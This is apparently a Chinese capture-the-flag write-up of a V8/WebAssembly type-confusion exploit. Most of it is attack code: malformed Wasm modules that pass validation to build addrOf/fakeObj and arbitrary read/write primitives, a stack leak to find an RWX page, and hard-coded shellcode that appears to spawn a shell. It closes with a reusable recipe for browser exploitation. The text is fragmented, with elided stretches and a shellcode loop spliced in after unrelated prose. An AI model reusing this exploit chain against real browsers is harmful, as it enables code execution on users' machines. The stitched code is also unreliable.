...
题目利用 V8/WASM 类型校验缺陷。构造非法但可通过验证的 Wasm 模块，把 `externref` 与 `i64` 互转以获得 `addrOf/fakeObj`，随后泄露栈和 RWX 页并写入 shellcode。
...
//  - several arguments, each of which is either a number or a string of
length
...
let kDataCountSectionCode = 12;  // Data segment count (between Element &
Code)
let kTagSectionCode = 13;        // Tag section (between Memory & Global)
let kStringRefSectionCode = 14;  // Stringref literals section (between Tag &
Global)
...
// These are defined as negative integers to distinguish them from positive
type
// indices.
...
let kSig_i_iiii = makeSig([kWasmI32, kWasmI32, kWasmI32, kWasmI32],
[kWasmI32]);
let kSig_v_iiii = makeSig([kWasmI32, kWasmI32, kWasmI32, kWasmI32], []);
let kSig_l_iiii = makeSig([kWasmI32, kWasmI32, kWasmI32, kWasmI32],
[kWasmI64]);
...
let kSig_f_ffff = makeSig([kWasmF32, kWasmF32, kWasmF32, kWasmF32],
[kWasmF32]);
let kSig_d_dd = makeSig([kWasmF64, kWasmF64], [kWasmF64]);
let kSig_d_dddd = makeSig([kWasmF64, kWasmF64, kWasmF64, kWasmF64],
[kWasmF64]);
let kSig_l_ll = makeSig([kWasmI64, kWasmI64], [kWasmI64]);
let kSig_l_llll = makeSig([kWasmI64, kWasmI64, kWasmI64, kWasmI64],
[kWasmI64]);
...
let kSig_iii_ii = makeSig([kWasmI32, kWasmI32], [kWasmI32, kWasmI32,
kWasmI32]);
...
// Use these for multi-byte instructions (opcode > 0x7F needing two LEB
bytes):
...
class WasmModuleBuilder {
  ...
  addMemory(min, max, shared) {
    // Note: All imported memories are added before declared ones (see the
check
...
check
  ...
  addImport(module, name, type) {
    if (this.functions.length != 0) {
      throw new Error('Imported functions must be declared before local
ones');
    }
    let type_index = (typeof type) == 'number' ? type : this.addType(type);
    this.imports.push({
  ...
  addImportedMemory(module, name, initial = 0, maximum, shared, is_memory64) {
    ...
    let mem_index = this.imports.filter(i => i.kind ==
kExternalMemory).length;
    let o = {
      module: module,
      name: name,
...
+
    ...
    this.exports.push({name: name, kind: kExternalMemory, index:
memory_index});
  }
  ...
  appendToTable(array) {
    for (let n of array) {
      if (typeof n != 'number')
        throw new Error('invalid table (entries have to be numbers): ' +
array);
    }
    if (this.tables.length == 0) {
  ...
  setTableBounds(min, max = undefined) {
    if (this.tables.length != 0) {
      throw new Error('The table bounds of table \'0\' have already been
set.');
    }
  ...
  // `instruction_frequencies` must be an array of {offset, frequency}
objects.
      ...
      binary.emit_section(kImportSectionCode, section => {
        ...
        for (let imp of wasm.imports) {
          ...
          if (imp.kind == kExternalFunction) {
            ...
            let limits_byte =
                (is_memory64 ? 4 : 0) | (is_shared ? 2 : 0) | (has_max ? 1 :
0);
            ...
            let limits_byte =
                (is_table64 ? 4 : 0) | (is_shared ? 2 : 0) | (has_max ? 1 :
0);
    ...
    if (wasm.globals.length > 0) {
      ...
      binary.emit_section(kGlobalSectionCode, section => {
        ...
        for (let global of wasm.globals) {
          ...
          section.emit_u8((global.mutable ? 1 : 0) | (global.shared ? 0b10 :
0));
...
// Note: Since {val} is a JS number, the generated constant only has 53 bits
of
// precision.
...
(function() {
  return [
    ...
    (labelIdx, sourceType, targetType) =>
      wasmBrOnCastImpl(labelIdx, sourceType, targetType,
kExprBrOnCastDescFail),
  ];
  function wasmBrOnCastImpl(labelIdx, sourceType, targetType, opcode) {
    ...
    return [
      kGCPrefix, opcode, flags, ...labelIdx,
...wasmEncodeHeapType(sourceType),
...
function RandomLeak() {
  const sig_i_v = makeSig([], [kWasmI64, kWasmI64, kWasmF64, kWasmF64]);
  const builder = new WasmModuleBuilder();

  builder
    .addFunction('bad', sig_i_v)
    .addBodyWithEnd([
      kExprEnd,
    ])
    .exportFunc();
...
function addrOf(obj) {
  ...
  const mod = new WebAssembly.Module(module_bytes);
  const instance = new WebAssembly.Instance(mod, {});
  print('[+] invalid-merge module validated & instantiated (addrOf)');
...
function fakeObj(addr) {
  ...
  const mod = new WebAssembly.Module(module_bytes);
  const instance = new WebAssembly.Instance(mod, {});
  print('[+] invalid-merge module validated & instantiated (fakeObj)');
  return instance.exports.fake(addr);
}

function buildStructI64CasterModule() {
  const builder = new WasmModuleBuilder();
...
var f_arr = [1.1];
let addr = addrOf(f_arr);
console.log('[+] f_arr addr =', hex(addr));
var ooo = fakeObj(addr);

const structMod = buildStructI64CasterModule();

function read64(addr) {
  return structMod.get_field(addr);
}
function write64(addr, value) {
  structMod.set_field(addr, value);
}

console.log(hex(read64(addr)));

const victim_builder = new WasmModuleBuilder();
victim_builder.addFunction('victim', makeSig([], []))
  .addBodyWithEnd([
    kExprEnd,
  ])
  .exportFunc();
const victim_module_bytes = victim_builder.toBuffer();
const victim_mod = new WebAssembly.Module(victim_module_bytes);
const victim_instance = new WebAssembly.Instance(victim_mod, {});

const i_stacK_leak = f2i(stack_leak);

console.log("stack leak: " + hex(i_stacK_leak));

for (var i = 0n; i < 1024n; i++) {
  console.log("stack leak[" + i + "]: " + hex(read64(i_stacK_leak + i * 8n +
1n)));
}

const rwx_leak = read64(i_stacK_leak + 11n * 8n + 1n);
console.log("rwx leak: " + hex(rwx_leak));

for (var i = 0n; i < 100n; i++) {
  if (i < 10n)
  {
    write64(rwx_leak + i * 8n + 1n, 0x9090909090909090n);
    continue;
  }
  if (i == 0n + 10n)  {
    write64(rwx_leak + 0n, 0x6E69622FB848686An);
    continue;
  }
  if (i == 1n + 10n)  {
    write64(rwx_leak + 8n, 0xE7894850732F2F2Fn);
    continue;
  }

### 参考链接补充

WebAssembly 规范中 element section 的 section id 是 `9`，内容是 element segment 列表；每个 segment 描述函数引用如何初始化 table，二进制编码里会出现 active/passive/declarative 等不同 flag 形式。V8 代码注释引用的正是这一节规范。

本题利用点在于 no-check WASM 构造阶段没有完整校验 element segment 与 table/function/type 的一致性。构造畸形 element section 后，后续 JIT/实例化阶段仍会按规范格式解释这些字段，从而制造可控函数表或类型混淆 primitive。写 exploit 时只需保留规范字段顺序：section id、segment count、segment flag/header、offset expression 或函数索引列表，再把异常组合喂给目标引擎触发后续 RWX 写入链。

### 跨页补回：RWX shellcode 写入收尾

if (i == 2n + 10n)  {
    write64(rwx_leak + 16n, 0x2434810101697268n);
    continue;
  }
  if (i == 3n + 10n)  {
    write64(rwx_leak + 24n, 0x6A56F63101010101n);
    continue;
  }
  if (i == 4n + 10n)  {
    write64(rwx_leak + 32n, 0x894856E601485E08n);
    continue;
  }
  if (i == 5n + 10n)  {
    write64(rwx_leak + 40n, 0x050F583B6AD231E6n);
    continue;
  }
  write64(rwx_leak + i * 8n + 1n, 0xFFFFFEC0E9909090n);
}

## 方法总结

- 核心技巧：WASM 类型混淆获取对象地址和伪造对象。
- 识别信号：可构造异常签名的 Wasm 函数并在 V8 中通过验证。
- 复用要点：浏览器/V8 pwn 先搭稳定的 `addrOf/fakeObj/read64/write64` 原语，再写 RWX shellcode。
